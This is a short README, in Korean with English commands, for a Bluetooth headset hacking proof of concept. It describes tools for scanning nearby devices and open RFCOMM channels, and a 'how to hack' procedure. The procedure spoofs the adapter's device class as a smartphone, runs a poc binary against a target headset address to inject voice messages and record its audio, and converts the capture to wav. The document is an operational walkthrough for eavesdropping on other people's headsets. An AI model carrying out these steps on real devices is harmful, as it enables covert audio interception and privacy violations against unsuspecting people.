** poc.c compile
 >> gcc -o poc poc.c -lbluetooth 

** raw -> wav
 >> sox -b 16 -s -c 1 -r 8100 -t raw [in.raw] [out.wav]
** wav -> raw
 >> sox --bits 16 --encoding signed-integer --endian little [in.wav] [out.raw]

<File info>
  btScan.py :: 주변의 블루투스 기기를 스캔한다. 단, 해당기기가 검색허용상태여야 한다.
  rfcommScan.py :: rfcomm프로토콜의 열린 채널을 검색한다.(나의 이어셋 채널은 4개밖에 없어서 channel4까지만 scan)
  poc :: 블루투스 이어셋에 음성메시지를 전송하고 상대의 음성메시지를 받아온다.

<how to hack>
1. sudo hciconfig hci0 up			//장비를 on시킨다.
2. hciconfig -a 					//장비의 정보 중에 class가 있는데 이어셋을 해킹하기 위해서는
3. hciconfig hci0 class 0x50020c	//0x50020c로 변경한다.:: class-SmartPhone, telephony, ObjectTransfer
									//(http://bluetooth-pentest.narod.ru/software/bluetooth_class_of_device-service_generator.html)
4. hcitool scan						//주변 블루투스 장비를 검색한다.
5. ./poc <hci#> <messagefile> <recordfile> <bdaddr> [channel]	// tool 사용.
6. sox -b 16 -s -c 1 -r 8100 -t raw [in.raw] [out.wav] 	//수신한 데이터를 wav파일로 변경
